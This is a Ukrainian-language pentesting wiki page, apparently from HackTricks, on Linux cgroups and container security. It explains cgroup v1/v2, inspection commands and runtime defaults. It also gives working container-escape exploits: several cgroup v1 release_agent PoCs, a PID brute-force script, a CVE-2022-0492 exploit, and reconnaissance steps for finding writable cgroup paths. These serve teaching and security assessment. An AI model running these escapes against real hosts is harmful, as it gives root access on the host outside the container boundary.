# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

Linux **control groups** — це механізм ядра, призначений для об'єднання процесів з метою обліку, обмеження, визначення пріоритетів і застосування політик. Якщо namespaces переважно ізолюють представлення ресурсів, то cgroups переважно керують тим, **скільки** цих ресурсів може споживати набір процесів і, у деяких випадках, **з якими класами ресурсів** вони взагалі можуть взаємодіяти. Контейнери постійно покладаються на cgroups, навіть коли користувач ніколи не переглядає їх безпосередньо, оскільки майже кожному сучасному runtime потрібен спосіб повідомити ядру: "ці процеси належать до цього workload, і до них застосовуються такі правила використання ресурсів".

Саме тому container engines розміщують новий контейнер у власному дереві cgroup. Коли дерево процесів опиняється там, runtime може обмежити пам'ять, обмежити кількість PID, визначити вагу використання CPU, регулювати I/O і обмежити доступ до пристроїв. У production-середовищі це необхідно як для безпеки multi-tenant, так і для простої операційної гігієни. Контейнер без змістовних обмежень ресурсів може вичерпати пам'ять, створити надмірну кількість процесів або монополізувати CPU та I/O, зробивши host чи сусідні workload нестабільними.

З погляду безпеки cgroups важливі з двох окремих причин. По-перше, неправильні або відсутні обмеження ресурсів уможливлюють прості атаки denial-of-service. По-друге, деякі функції cgroups, особливо у старих середовищах **cgroup v1**, історично створювали потужні примітиви для breakout, коли доступ на запис до них був можливий зсередини контейнера.

## v1 проти v2

У використанні є дві основні моделі cgroups. **cgroup v1** надає кілька ієрархій контролерів, а старі exploit writeups часто зосереджуються на доступній там дивній і подекуди надмірно потужній семантиці. **cgroup v2** запроваджує більш уніфіковану ієрархію та загалом чистішу поведінку. Сучасні дистрибутиви дедалі частіше надають перевагу cgroup v2, але змішані або legacy-середовища все ще існують, а це означає, що обидві моделі залишаються актуальними під час аналізу реальних систем.

Ця відмінність важлива, оскільки деякі з найвідоміших історій про container breakout, як-от зловживання **`release_agent`** у cgroup v1, дуже специфічно пов'язані зі старою поведінкою cgroup. Читач, який побачить cgroup exploit у блозі, а потім бездумно застосує його до сучасної системи, що використовує лише cgroup v2, імовірно, неправильно зрозуміє, що на цілі насправді можливо.

## Перевірка

Найшвидший спосіб дізнатися, де розташована ваша поточна shell, — це:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Файл `/proc/self/cgroup` показує шляхи cgroup, пов’язані з поточним процесом. На сучасному хості з cgroup v2 ви часто побачите уніфікований запис. На старіших або гібридних хостах можна побачити кілька шляхів контролерів v1. Знаючи шлях, ви можете перевірити відповідні файли в `/sys/fs/cgroup`, щоб переглянути ліміти та поточне використання.

На хості з cgroup v2 корисними будуть такі команди:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ці файли показують, які контролери існують і які з них делеговані дочірнім cgroups. Ця модель делегування важлива в rootless- і systemd-керованих середовищах, де runtime може мати змогу керувати лише тією частиною функціональності cgroup, яку батьківська ієрархія фактично делегує.

## Лабораторія

Один зі способів побачити cgroups на практиці — запустити контейнер з обмеженням пам’яті:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Ви також можете спробувати контейнер з обмеженням за PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Ці приклади корисні, оскільки допомагають пов’язати runtime flag з файловим інтерфейсом ядра. Runtime не застосовує правило магічним чином: він записує відповідні налаштування cgroup, після чого дозволяє ядру застосувати їх до дерева процесів.

## Використання runtime

Docker, Podman, containerd і CRI-O покладаються на cgroups у межах нормальної роботи. Відмінності зазвичай полягають не в тому, чи використовують вони cgroups, а в тому, **які значення за замовчуванням вони обирають**, **як вони взаємодіють із systemd**, **як працює rootless delegation** і **яка частина конфігурації контролюється на рівні engine, а яка — на рівні orchestration**.

У Kubernetes resource requests і limits зрештою перетворюються на конфігурацію cgroup на node. Шлях від Pod YAML до застосування правила ядром проходить через kubelet, CRI runtime і OCI runtime, але cgroups усе одно залишаються механізмом ядра, який зрештою застосовує це правило. У середовищах Incus/LXC cgroups також активно використовуються, особливо тому, що system containers часто надають багатше дерево процесів і більш схожі на VM операційні очікування.

## Неправильні конфігурації та breakouts

Класична історія безпеки cgroup пов’язана з доступним для запису механізмом **cgroup v1 `release_agent`**. У цій моделі, якщо attacker міг записувати у відповідні файли cgroup, увімкнути `notify_on_release` і контролювати шлях, збережений у `release_agent`, ядро могло зрештою виконати шлях, обраний attacker, в initial namespaces на host, коли cgroup ставала порожньою. Саме тому старі writeups приділяють так багато уваги доступності для запису cgroup controllers, mount options і умовам namespace/capability.

Навіть коли `release_agent` недоступний, помилки в cgroup усе одно мають значення. Надто широкі дозволи на devices можуть зробити host devices доступними з container. Відсутність memory і PID limits може перетворити простий code execution на host DoS. Слабка cgroup delegation у rootless сценаріях також може ввести defenders в оману, змусивши їх вважати, що обмеження існує, хоча runtime фактично ніколи не міг його застосувати.

### Передумови `release_agent`

Техніка `release_agent` застосовується лише до **cgroup v1**. Основна ідея полягає в тому, що коли останній процес у cgroup завершує роботу і встановлено `notify_on_release=1`, ядро виконує програму, шлях до якої збережено в `release_agent`. Це виконання відбувається в **initial namespaces на host**, що й перетворює доступний для запису `release_agent` на primitive для container escape.

Для роботи техніки attacker зазвичай потрібні:

- доступна для запису ієрархія **cgroup v1**
- можливість створити або використати child cgroup
- можливість встановити `notify_on_release`
- можливість записати шлях у `release_agent`
- шлях, який з точки зору host вказує на executable

### Класичний PoC

Історичний однорядковий PoC має такий вигляд:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Цей PoC записує шлях до payload у `release_agent`, запускає звільнення cgroup, а потім зчитує файл виводу, створений на host.

### Зрозумілий покроковий опис

Ту саму ідею легше зрозуміти, якщо розбити її на кроки.

1. Створіть і підготуйте доступний для запису cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Визначте шлях на хості, що відповідає файловій системі контейнера:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Розмістіть payload, який буде видимим зі шляху хоста:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Ініціюйте виконання, зробивши cgroup порожньою:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Результатом є виконання payload на стороні host із привілеями root host. У реальному exploit payload зазвичай записує proof file, запускає reverse shell або змінює стан host.

### Варіант із відносним шляхом через `/proc/<pid>/root`

У деяких середовищах шлях host до файлової системи контейнера неочевидний або прихований storage driver. У такому разі шлях до payload можна вказати через `/proc/<pid>/root/...`, де `<pid>` — це PID host, що належить процесу в поточному контейнері. На цьому ґрунтується варіант brute-force із відносним шляхом:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Відповідний trick тут полягає не в самому brute force, а у формі шляху: `/proc/<pid>/root/...` дає kernel змогу визначити файл усередині файлової системи container з host namespace, навіть коли прямий шлях до сховища host заздалегідь невідомий.

### Варіант CVE-2022-0492

У 2022 році CVE-2022-0492 продемонструвала, що запис до `release_agent` у cgroup v1 некоректно перевіряв наявність `CAP_SYS_ADMIN` у **початковому** user namespace. Це зробило техніку набагато доступнішою на вразливих kernels, оскільки container process, який міг змонтувати cgroup hierarchy, міг записувати до `release_agent`, не маючи попередньо привілеїв у host user namespace.

Мінімальний exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
У вразливому ядрі хост виконує `/proc/self/exe` із привілеями root хоста.

Для практичного зловживання спочатку перевірте, чи середовище все ще надає доступ до шляхів cgroup-v1 із правом запису або небезпечних пристроїв:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Якщо `release_agent` присутній і доступний для запису, ви вже перебуваєте на території legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Якщо сам cgroup-шлях не дає змоги здійснити escape, наступним практичним застосуванням часто є denial of service або reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Ці команди швидко показують, чи має workload можливість запустити fork-bomb, агресивно споживати пам’ять або зловживати доступним для запису legacy cgroup interface.

## Перевірки

Під час перевірки цілі purpose cgroup checks полягає в тому, щоб визначити, яка cgroup model використовується, чи бачить container доступні для запису controller paths і чи взагалі актуальні старі breakout primitives, такі як `release_agent`.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Що тут цікаво:

- Якщо `mount | grep cgroup` показує **cgroup v1**, старі writeups про breakout стають більш актуальними.
- Якщо `release_agent` існує та доступний, це одразу варто дослідити глибше.
- Якщо видима ієрархія cgroup доступна для запису, а контейнер також має сильні capabilities, це середовище заслуговує на значно ретельніший аналіз.

Якщо ви виявили **cgroup v1**, доступні для запису mounts контролерів і контейнер, який також має сильні capabilities або слабкий захист seccomp/AppArmor, цю комбінацію потрібно уважно дослідити. cgroups часто сприймають як нецікаву тему керування ресурсами, але історично вони були частиною одних із найповчальніших ланцюжків container escape саме тому, що межа між "керуванням ресурсами" та "впливом на host" не завжди була такою чіткою, як вважалося.

## Типові налаштування runtime

| Runtime / платформа | Типовий стан | Типова поведінка | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням | Контейнери автоматично розміщуються в cgroups; обмеження ресурсів є необов'язковими, якщо їх не встановити за допомогою flags | пропуск `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Увімкнено за замовчуванням | `--cgroups=enabled` є типовим значенням; namespace cgroup залежить від версії cgroup (`private` у cgroup v2, `host` у деяких конфігураціях cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, послаблений доступ до пристроїв, `--privileged` |
| Kubernetes | Типово увімкнено через runtime | Pods і контейнери розміщуються в cgroups runtime вузла; детальний контроль ресурсів залежить від `resources.requests` / `resources.limits` | пропуск resource requests/limits, privileged-доступ до пристроїв, неправильна конфігурація runtime на рівні host |
| containerd / CRI-O | Увімкнено за замовчуванням | cgroups є частиною стандартного керування життєвим циклом | прямі конфігурації runtime, які послаблюють контроль пристроїв або відкривають legacy-доступні для запису інтерфейси cgroup v1 |

Важливо розрізняти, що **наявність cgroup** зазвичай є типовою, тоді як **корисні обмеження ресурсів** часто є необов'язковими, якщо їх явно не налаштовано.
{{#include ../../../../banners/hacktricks-training.md}}
